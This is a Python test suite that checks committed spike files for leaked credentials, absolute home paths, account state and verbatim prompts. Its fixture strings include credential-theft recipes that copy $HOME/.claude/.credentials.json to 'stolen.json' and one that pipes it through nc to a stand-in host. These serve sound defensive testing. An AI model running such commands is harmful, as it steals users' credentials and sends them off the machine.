"""test_committed_tree_sanitization.py — Client-agnostic sanitization of committed spike text.

test_claude_code_observations.py covers the claude-code evidence set by name.
That is how the probe scripts came to be unguarded in the first place: a
mutation adding `cp $HOME/.claude/.credentials.json` and an absolute home path
to `claude-code/probe/run.sh` left the whole suite green, because nothing looked
at those files. Naming them fixed claude-code and left the NEXT client — codex,
and whatever follows — with the identical blind spot.

This file removes the "remember to add it" step. It walks
`spikes/platform/clients/**` and the published evidence and artifact trees and
asserts that no committed text file anywhere in them carries an absolute machine
path, a credential-like value, the disposable probe root, or a copy of a
credential file. A new client directory is swept the moment it lands.

The sweep's own vacuity is a first-class failure: a walk that matches nothing
must be an error, not a pass. Every root is asserted non-empty independently,
and the files the previous fix covered by name are asserted to be inside the set
this file walks by shape.
"""
from __future__ import annotations

import json
import subprocess
import tempfile
import unittest
from pathlib import Path

from tests.kinglet_spike import spike_tree
from tests.kinglet_spike.spike_tree import (
    ACCOUNT_STATE_FIELD,
    ALLOWED_CREDENTIAL_REFERENCE,
    ARTIFACTS_ROOT,
    CLIENTS_ROOT,
    UNITY_ROOT,
    CREDENTIAL_FILE,
    DISPOSABLE_CONFIG_VARS,
    EVIDENCE_ROOT,
    PROBE_ROOT,
    REPO,
    SKIP_DIR_NAMES,
    SKIP_RELATIVE_DIRS,
    SWEPT_ROOTS,
    SECRET_JSON_FIELD,
    committed_text_files,
    credential_copy_violations,
    files_by_root,
    frozen_prompt_bodies,
    is_script,
    relative,
    verbatim_prompt_violations,
)
from tools.kinglet_spike.validate import SECRET_PATTERNS, SENSITIVE_PATH_PATTERNS

# Files that exist today and must be inside the swept set. If a rename or a
# narrowed glob drops one of them, the sweep is quietly scanning less than it
# claims and this list says so. It is not a whitelist — nothing is exempt.
KNOWN_COVERED = (
    # Both live client subjects are named. The sweep is generic and covers a new
    # client the moment its directory exists, but "generic" is a claim, and a
    # list that only ever names the FIRST client is how that claim goes stale
    # without anything going red.
    "spikes/platform/clients/codex/observations-linux.json",
    "spikes/platform/clients/codex/runbook.md",
    "spikes/platform/clients/codex/hooks/pre-mutation-hook.sh",
    "spikes/platform/clients/claude-code/probe/run.sh",
    "spikes/platform/clients/claude-code/probe/run2.sh",
    "spikes/platform/clients/claude-code/observations-linux.json",
    "spikes/platform/clients/claude-code/runbook.md",
    "spikes/platform/clients/claude-code/hooks/pre-mutation-hook.sh",
    "spikes/platform/clients/shared/create-project.sh",
    "spikes/platform/clients/shared/create-project.ps1",
    # One record per matrix probe cell. All three are named: a sweep that
    # reached only the first would leave two thirds of the published evidence
    # unscanned while still looking covered.
    "docs/research/platform-spike/evidence/client/claude-code/"
    "20260727T095800Z-client-probe-claudecode-linux-ubuntu-24.04.4-lts-x64"
    "-local-executable-01.json",
    "docs/research/platform-spike/evidence/client/claude-code/"
    "20260727T095800Z-client-probe-claudecode-linux-ubuntu-24.04.4-lts-x64"
    "-mcp-discovery-01.json",
    "docs/research/platform-spike/evidence/client/claude-code/"
    "20260727T095800Z-client-probe-claudecode-linux-ubuntu-24.04.4-lts-x64"
    "-path-semantics-01.json",
    "docs/research/platform-spike/artifacts/client/claude-code/"
    "20260727T095800Z-client-probe-claudecode-linux-ubuntu-24.04.4-lts-x64"
    "-mcp-discovery-01/prompts-used.json",
    # The unity subject, named for the same reason both clients are: the two
    # operator-run shell scripts handle Editor paths and repository roots, the
    # fixture is committed Unity project text, and one published record and one
    # published artifact stand for the nine and fifteen of them. A list that
    # names only the client subject is exactly how "the sweep is generic" goes
    # stale without anything going red.
    "spikes/platform/unity/run-host.sh",
    "spikes/platform/unity/sweep-workspace.sh",
    "spikes/platform/unity/mcp.lock.json",
    "spikes/platform/unity/fixture/ProjectSettings/ProjectVersion.txt",
    "spikes/platform/unity/fixture/Assets/KingletSpike/Editor/KingletSpikeProbe.cs",
    "docs/research/platform-spike/evidence/unity/execution/"
    "20260728T132858Z-unity-probe-isolated-headless-linux-ubuntu-24-04-4-lts-x64-01.json",
    "docs/research/platform-spike/artifacts/unity/"
    "20260728T132858Z-unity-probe-isolated-headless-linux-ubuntu-24-04-4-lts-x64-01/"
    "isolated-headless-manifest.json",
)


class SweepIsNotVacuousTests(unittest.TestCase):
    """The sweep must fail loudly rather than walk nothing.

    A sanitization test that scans zero files passes forever. Each of these
    assertions exists because the cheapest way to "fix" a failing sweep is to
    point it somewhere emptier.
    """

    def test_every_root_contributes_files(self):
        for root, paths in files_by_root():
            self.assertGreater(
                len(paths), 0, f"sanitization sweep walked zero files under {root}"
            )

    def test_all_three_roots_are_swept(self):
        roots = {root for root, _paths in files_by_root()}
        self.assertEqual(
            roots, {CLIENTS_ROOT, UNITY_ROOT, EVIDENCE_ROOT, ARTIFACTS_ROOT}
        )

    # There was a `>= 20` file-count floor here. It was deleted: every truncation
    # it could catch is already caught by test_known_covered_files_are_in_the_
    # swept_set with a named path, the number needed bumping by hand forever, and
    # a floor that never fires reads as coverage it does not provide.

    def test_known_covered_files_are_in_the_swept_set(self):
        swept = {relative(path) for path in committed_text_files()}
        for name in KNOWN_COVERED:
            self.assertTrue(
                (REPO / name).is_file(), f"{name} vanished; update KNOWN_COVERED"
            )
            self.assertIn(
                name, swept, f"{name} is committed but the sanitization sweep misses it"
            )

    def test_every_client_directory_is_swept(self):
        # The point of the change: a new client directory is covered by default.
        # If codex/ lands with zero swept files, that is the old blind spot back.
        swept = {relative(path) for path in committed_text_files()}
        clients = [
            child
            for child in sorted(CLIENTS_ROOT.iterdir())
            if child.is_dir() and not child.name.startswith(".")
        ]
        self.assertTrue(clients, f"no client directories under {CLIENTS_ROOT}")
        for client in clients:
            prefix = relative(client) + "/"
            self.assertTrue(
                any(name.startswith(prefix) for name in swept),
                f"{prefix} contributes no file to the sanitization sweep",
            )

    def test_no_build_output_directory_is_skipped_by_name(self):
        # `bin`, `dist`, `obj` and `target` were skipped by NAME at any depth,
        # which gave every client a no-scan zone: `clients/<any>/bin/leak.sh` was
        # green here and invisible to the CI grep. Build output is skipped by
        # anchored path now; reintroducing a name reopens the hole for every
        # client at once, including ones that do not exist yet.
        for name in ("bin", "dist", "obj", "target", "build", "out", "vendor"):
            self.assertNotIn(
                name,
                SKIP_DIR_NAMES,
                f"{name!r} is skipped by directory name at any depth, so "
                f"clients/<any>/{name}/ is a silent no-scan zone",
            )

    def test_skipped_relative_directories_are_anchored(self):
        # A skip must name one exact place. A bare directory name would be back
        # to matching at any depth under every client, which is the hole above.
        roots = tuple(relative(root) + "/" for root in SWEPT_ROOTS)
        for rel in SKIP_RELATIVE_DIRS:
            self.assertFalse(rel.startswith("/"), f"{rel!r} is not repo-relative")
            self.assertIn("/", rel, f"{rel!r} is a bare name, not an anchored path")
            self.assertTrue(
                rel.startswith(roots),
                f"{rel} is skipped but lies outside every swept root, so the skip "
                f"is either dead or the roots moved: {roots}",
            )

    def test_no_tracked_file_hides_in_a_skipped_directory(self):
        # Skipping is only safe while nothing tracked lives behind it. This is the
        # assertion that lets the tool-cache names stay name-matched.
        try:
            listed = subprocess.run(
                ["git", "ls-files", "-z", "--", *[relative(r) for r in SWEPT_ROOTS]],
                cwd=REPO,
                capture_output=True,
                text=True,
                check=True,
            ).stdout
        except (OSError, subprocess.CalledProcessError) as error:  # pragma: no cover
            self.skipTest(f"git unavailable: {error}")
        tracked = [name for name in listed.split("\0") if name]
        self.assertTrue(tracked, "git listed no tracked files under the swept roots")
        for name in tracked:
            parts = name.split("/")[:-1]
            hidden = [part for part in parts if part in SKIP_DIR_NAMES]
            self.assertFalse(
                hidden,
                f"{name} is tracked but sits under skipped directory {hidden}",
            )
            for rel in SKIP_RELATIVE_DIRS:
                self.assertFalse(
                    name.startswith(rel + "/"),
                    f"{name} is tracked but sits under skipped path {rel}",
                )


class CommittedTreeSanitizationTests(unittest.TestCase):
    def test_no_committed_file_carries_an_absolute_machine_path(self):
        for path in committed_text_files():
            content = path.read_text(encoding="utf-8")
            for pattern in SENSITIVE_PATH_PATTERNS:
                match = pattern.search(content)
                self.assertIsNone(
                    match,
                    f"{relative(path)} contains an absolute user path: "
                    f"{match.group(0) if match else ''!r}",
                )

    def test_no_committed_file_carries_a_credential_like_value(self):
        for path in committed_text_files():
            content = path.read_text(encoding="utf-8")
            for pattern in SECRET_PATTERNS:
                match = pattern.search(content)
                self.assertIsNone(
                    match,
                    f"{relative(path)} contains a credential-like value: "
                    f"{match.group(0) if match else ''!r}",
                )

    def test_no_committed_file_leaks_the_disposable_probe_root(self):
        for path in committed_text_files():
            self.assertIsNone(
                PROBE_ROOT.search(path.read_text(encoding="utf-8")),
                f"{relative(path)} leaks the disposable probe root",
            )

    def test_no_committed_file_copies_a_credential_file(self):
        # Checking that "$CFG/.credentials.json" EXISTS is allowed — provisioning
        # the disposable root is a manual operator step. Copying, catting, or
        # otherwise moving that file is not, in any client, in any language.
        #
        # This follows the credential across assignments rather than requiring the
        # filename and the copy verb on ONE line. Same-line-only was defeated by
        # splitting the two, and it was the only credential rule applied to
        # non-scripts — so a multi-line copy recipe in a client's runbook.md
        # passed, unexecuted but ready to paste.
        for path in committed_text_files():
            for number, line, reason in credential_copy_violations(
                path.read_text(encoding="utf-8")
            ):
                self.fail(f"{relative(path)}:{number} {reason}: {line.strip()!r}")

    def test_no_committed_file_carries_a_json_spelled_secret(self):
        # SECRET_PATTERNS knows `token=...`, the SHELL spelling. Every artifact
        # this spike publishes is JSON, where the same field is spelled with a
        # colon, so a pasted auth.json was structurally invisible to the sweep.
        for path in committed_text_files():
            match = SECRET_JSON_FIELD.search(path.read_text(encoding="utf-8"))
            self.assertIsNone(
                match,
                f"{relative(path)} carries a JSON-spelled secret field: "
                f"{match.group(0) if match else ''!r}",
            )

    def test_no_committed_file_carries_operator_account_state(self):
        # Account tier and rate-limit state identify the operator's subscription
        # and usage and evidence nothing about a client's capabilities -- the
        # record pins the client BUILD, not who paid for it. This entered the
        # tree once already, by copying a saved session rollout wholesale into a
        # reconstructed trace instead of applying the elision the live --json
        # path applies for you.
        for path in committed_text_files():
            match = ACCOUNT_STATE_FIELD.search(path.read_text(encoding="utf-8"))
            self.assertIsNone(
                match,
                f"{relative(path)} carries operator account state: "
                f"{match.group(0) if match else ''!r}",
            )

    def test_no_published_evidence_carries_a_verbatim_frozen_prompt(self):
        # The plan is explicit: EVIDENCE stores a prompt's ID and its SHA-256,
        # never the body. prompts-v1.json is the catalog and is therefore the
        # one file allowed to hold the text; verbatim_prompt_violations exempts
        # it by resolved path, not by name.
        #
        # Scoped to the published roots on purpose, and the scope is the whole
        # judgement here. Both clients' runbook.md quote the four prompt bodies
        # inline, because a runbook is an operator PROCEDURE -- someone has to
        # be able to read what to type -- and those files were written and
        # reviewed that way. The constraint is about what a captured run leaves
        # behind: a transcript that echoes the prompt turns every published
        # artifact into a second, uncontrolled copy of the catalog, and the
        # elision the live `--json` path already applies is what this pins.
        # Widening this to committed_text_files() would fail the two runbooks
        # and say nothing true about the leak it exists to catch.
        for root in (EVIDENCE_ROOT, ARTIFACTS_ROOT):
            for path in spike_tree._walk(root):
                for prompt_id, _body in verbatim_prompt_violations(
                    path, path.read_text(encoding="utf-8")
                ):
                    self.fail(
                        f"{relative(path)} commits the body of frozen prompt "
                        f"{prompt_id!r} verbatim; store the id and its SHA-256"
                    )

    def test_the_prompt_catalog_itself_is_swept_but_not_flagged(self):
        # The exemption has to be exactly one file, and it has to be the real
        # one. If prompts-v1.json were exempted by filename, any artifact
        # renamed to match would go unchecked; if it were not swept at all, the
        # sweep would have a hole shaped like the catalog.
        catalog = REPO / "spikes/platform/clients/contracts/prompts-v1.json"
        self.assertIn(catalog, committed_text_files())
        self.assertEqual(
            (),
            verbatim_prompt_violations(catalog, catalog.read_text(encoding="utf-8")),
        )
        self.assertTrue(frozen_prompt_bodies())

    def test_the_new_guards_fail_against_the_leaks_that_produced_them(self):
        # A guard with no failing case is not a guard. These three payloads are
        # the exact shapes that reached the committed tree, or reached it and
        # were invisible: the rollout's rate-limit block, a pasted auth.json,
        # and a frozen prompt body copied out of a session transcript.
        _prompt_id, prompt_body = frozen_prompt_bodies()[0]

        account_state = '{"rate_limits": {"plan_type": "plus", "balance": "0"}}'
        self.assertIsNotNone(ACCOUNT_STATE_FIELD.search(account_state))
        # ...and the old patterns saw nothing at all, which is the whole point.
        for pattern in SECRET_PATTERNS + SENSITIVE_PATH_PATTERNS:
            self.assertIsNone(pattern.search(account_state))

        pasted_auth = '{"access_token": "ey' + "J" * 40 + '", "id_token": "ey' + "K" * 40 + '"}'
        self.assertIsNotNone(SECRET_JSON_FIELD.search(pasted_auth))
        for pattern in SECRET_PATTERNS:
            self.assertIsNone(pattern.search(pasted_auth))

        with tempfile.TemporaryDirectory() as scratch:
            leaked = Path(scratch) / "trace.json"
            payload = '{"type": "user_message", "message": ' + json.dumps(prompt_body) + "}"
            leaked.write_text(payload, encoding="utf-8")
            self.assertTrue(verbatim_prompt_violations(leaked, payload))
            # An elided trace of the same run is clean.
            elided = '{"type": "user_message", "message": "<frozen-prompt-text-elided>"}'
            self.assertEqual((), verbatim_prompt_violations(leaked, elided))

    def test_a_short_placeholder_value_is_not_a_secret(self):
        # An artifact must be able to SAY a field was removed. The value guard
        # is length-based so "<elided>" stays legal while a real token does not.
        self.assertIsNone(SECRET_JSON_FIELD.search('{"access_token": "<gone>"}'))
        self.assertIsNotNone(
            SECRET_JSON_FIELD.search('{"access_token": "' + "a" * 40 + '"}')
        )

    def test_the_sweep_refuses_to_skip_a_file_it_cannot_decode(self):
        # `_walk` used to `continue` past UnicodeDecodeError. A committed
        # `leak.bin.txt` — a token, an absolute home path, a few stray \xff bytes
        # — was therefore green here AND invisible to the CI grep, which calls it
        # binary. Every file in the swept roots must now be either a declared
        # binary suffix or decodable; there is no third, silent category.
        #
        # The real tree exercises this by construction — committed_text_files()
        # raises if any file is undecodable — so the behaviour itself is pinned
        # here against a scratch directory, naming the path in the message.
        for path in committed_text_files():
            path.read_text(encoding="utf-8")

        with tempfile.TemporaryDirectory() as scratch:
            root = Path(scratch)
            (root / "ordinary.txt").write_text("fine\n", encoding="utf-8")
            # A leak-shaped payload, spelled so this file stays clean under the
            # repo's own grep: the bytes are what matter, not the wording.
            (root / "leak.bin.txt").write_bytes(
                b"token=gh" + b"p_x \xff\xfe home=" + b"/ho" + b"me/x\n"
            )
            with self.assertRaises(AssertionError) as raised:
                spike_tree._walk(root)
            self.assertIn("leak.bin.txt", str(raised.exception))

    def test_scripts_name_the_credential_file_only_as_a_presence_check(self):
        # Stricter than the copy rule, and applied to everything executable in
        # every client tree: a script may name the credential file ONLY as
        # "$CFG/.credentials.json" inside a KNOWN disposable config root. Any
        # other spelling — a path segment before it like
        # "$HOME/.claude/.credentials.json", or an unknown variable like
        # "$H/.credentials.json" where $H is the operator's real config — is a
        # leak.
        scripts = [path for path in committed_text_files() if is_script(path)]
        self.assertTrue(scripts, "no committed scripts found to check")
        for path in scripts:
            for number, line in enumerate(
                path.read_text(encoding="utf-8").splitlines(), start=1
            ):
                residue = ALLOWED_CREDENTIAL_REFERENCE.sub("", line)
                self.assertIsNone(
                    CREDENTIAL_FILE.search(residue),
                    f"{relative(path)}:{number} names the credential file outside "
                    f'a "$CFG/.credentials.json" presence check: {line.strip()!r}',
                )


class CredentialRuleBehaviourTests(unittest.TestCase):
    """The two credential rules, exercised against the shapes that defeated them.

    These run on strings, not on the tree, so they stay RED for the bypass even
    after someone deletes the offending file — the point is the rule, not the
    corpus.
    """

    # The three-line bypass, verbatim: a real-config directory in one variable,
    # the credential path built from it in a second, the copy naming neither.
    INDIRECTED_COPY = '\n'.join(
        (
            'H="$HOME/.claude"',
            'F="$H/.credentials.json"',
            'cp "$F" ./stolen.json',
        )
    )

    def test_variable_indirected_copy_is_caught(self):
        violations = credential_copy_violations(self.INDIRECTED_COPY)
        self.assertTrue(violations, "the three-line indirected copy passed")
        self.assertEqual(violations[-1][0], 3, "the copy line is not the one named")

    def test_indirection_through_several_hops_is_caught(self):
        text = '\n'.join(
            (
                'A="$HOME/.claude/.credentials.json"',
                'B="$A"',
                'C="$B"',
                'base64 "$C" > payload.txt',
            )
        )
        self.assertTrue(credential_copy_violations(text))

    def test_a_multi_line_prose_recipe_is_caught(self):
        # F18's shape: a runbook, not a script, so the strict script rule never
        # applies and the same-line rule was the only thing looking.
        text = '\n'.join(
            (
                "## Collecting the config",
                "",
                "1. Point a variable at the client config:",
                "",
                '       CRED="$HOME/.claude/.credentials.json"',
                "",
                "2. Keep a copy for the run:",
                "",
                '       cp "$CRED" ./saved.json',
            )
        )
        self.assertTrue(credential_copy_violations(text))

    def test_the_allowed_presence_check_is_still_allowed(self):
        text = '\n'.join(
            (
                'CFG="$BASE/cfg"',
                'if [ ! -f "$CFG/.credentials.json" ]; then',
                '  echo "provision it first" >&2',
                "fi",
            )
        )
        self.assertEqual(credential_copy_violations(text), ())

    def test_an_unknown_variable_is_not_a_presence_check(self):
        # The generic rule used to accept ANY variable, which is what made
        # `F="$H/.credentials.json"` look like provisioning.
        residue = ALLOWED_CREDENTIAL_REFERENCE.sub("", 'F="$H/.credentials.json"')
        self.assertIsNotNone(CREDENTIAL_FILE.search(residue))

    # -- the alphabet, exercised entry by entry ---------------------------
    #
    # DISPOSABLE_CONFIG_VARS listed eight names and only `CFG` worked: the
    # by-name claude-code rule kept its own $CFG-pinned allow-regex, so a probe
    # for any other client wrote a legitimate presence check and turned the
    # suite RED. Both tests below DERIVE from the tuple, so a ninth entry is
    # covered — in both directions — without anyone remembering.

    def test_every_disposable_config_var_permits_a_presence_check(self):
        self.assertTrue(DISPOSABLE_CONFIG_VARS, "the disposable-config alphabet is empty")
        for name in DISPOSABLE_CONFIG_VARS:
            for reference in (f"${name}", f"${{{name}}}"):
                line = f'if [ ! -f "{reference}/.credentials.json" ]; then'
                with self.subTest(var=name, spelling=reference):
                    self.assertIsNone(
                        CREDENTIAL_FILE.search(
                            ALLOWED_CREDENTIAL_REFERENCE.sub("", line)
                        ),
                        f"{name} is in DISPOSABLE_CONFIG_VARS but the strict "
                        f"script rule rejects a presence check using it, so no "
                        f"client can use that name: {line!r}",
                    )
                    self.assertEqual(
                        credential_copy_violations(line + "\n  exit 1\nfi"),
                        (),
                        f"{name} is in DISPOSABLE_CONFIG_VARS but a presence "
                        f"check using it reads as a copy: {line!r}",
                    )

    def test_every_disposable_config_var_still_forbids_a_copy(self):
        # The other direction: being on the alphabet buys a presence CHECK and
        # nothing else. A list that made `cp "$XDG_CONFIG_HOME/.credentials.json"`
        # green would be a leak per entry.
        for name in DISPOSABLE_CONFIG_VARS:
            with self.subTest(var=name):
                direct = f'cp "${name}/.credentials.json" ./stolen.json'
                self.assertTrue(
                    credential_copy_violations(direct),
                    f"a direct copy out of ${name} is not flagged: {direct!r}",
                )
                indirected = "\n".join(
                    (
                        f'F="${name}/.credentials.json"',
                        'tar cf out.tar "$F"',
                    )
                )
                self.assertTrue(
                    credential_copy_violations(indirected),
                    f"an indirected copy out of ${name} is not flagged",
                )

    def test_archive_and_transport_verbs_count_as_copying(self):
        # F20: in a `.md`/`.json` the strict script rule never runs, so the taint
        # follower is the only rule looking — and it only knew `cp`-shaped verbs.
        # Naming the file in a variable and then archiving, encrypting or
        # shipping it was a green, paste-ready recipe.
        for verb, invocation in (
            ("tar", 'tar cf out.tar "$CRED"'),
            ("zip", 'zip out.zip "$CRED"'),
            ("gzip", 'gzip -c "$CRED" > out.gz'),
            ("7z", '7z a out.7z "$CRED"'),
            ("gpg", 'gpg -c "$CRED"'),
            ("openssl", 'openssl enc -in "$CRED" -out out.enc'),
            ("nc", 'nc example.invalid 1 < "$CRED"'),
            ("ssh", 'ssh host "cat > out" < "$CRED"'),
            ("awk", 'awk \'{print}\' "$CRED"'),
            ("split", 'split -b 1k "$CRED" part-'),
            ("open", 'payload = open(CRED, "rb").read()'),
        ):
            text = "\n".join(('CRED="$HOME/.claude/.credentials.json"', invocation))
            with self.subTest(verb=verb):
                self.assertTrue(
                    credential_copy_violations(text),
                    f"{verb} moves the credential file out and is not flagged: "
                    f"{invocation!r}",
                )


if __name__ == "__main__":
    unittest.main()
